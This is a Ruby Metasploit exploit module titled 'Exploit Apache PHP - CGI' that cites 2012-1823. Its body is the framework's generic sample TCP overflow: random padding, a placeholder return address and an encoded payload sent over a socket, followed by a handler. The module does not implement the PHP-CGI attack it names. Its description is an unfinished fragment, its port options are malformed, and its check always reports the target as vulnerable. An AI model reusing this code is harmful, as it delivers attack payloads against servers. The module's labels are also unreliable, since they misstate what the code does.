##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class Metasploit4 < Msf::Exploit::Remote

  #
  # This exploit affects TCP servers, so we use the TCP client mixin.
  #
  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Exploit Apache PHP - CGI',
      'Description'    => %q{
          This exploit .
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['luisco100'],
      'Version'        => '$Revision: 15946 $',
      'References'     =>
        ['2012-1823'
        ],
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00",
        },
      'RPORT'          =>
	{
          'RPORT'   => 80,
	},
      'LPORT'          =>
	{
          'RPORT'   => 4444,
       },
      'Targets'        =>
        [
          # Target 0: Debian, Ubuntu
          [
            'Debian, Ubuntu',
            {
              'Platform' => 'linux',
              'Ret'      => 0x41424344
            }
          ],
        ],
      'DisclosureDate' => "Apr 1 2013",
      'DefaultTarget'  => 0))
  end

  #
  # The sample exploit just indicates that the remote host is always
  # vulnerable.
  #
  def check
    Exploit::CheckCode::Vulnerable
  end

  #
  # The exploit method connects to the remote service and sends 1024 random bytes
  # followed by the fake return address and then the payload.
  #
  def exploit
    connect

    print_status("Sending #{payload.encoded.length} byte payload...")

    # Build the buffer for transmission
    buf  = rand_text_alpha(1024)
    buf << [ target.ret ].pack('V')
    buf << payload.encoded

    # Send it off
    sock.put(buf)
    sock.get_once

    handler
  end

end
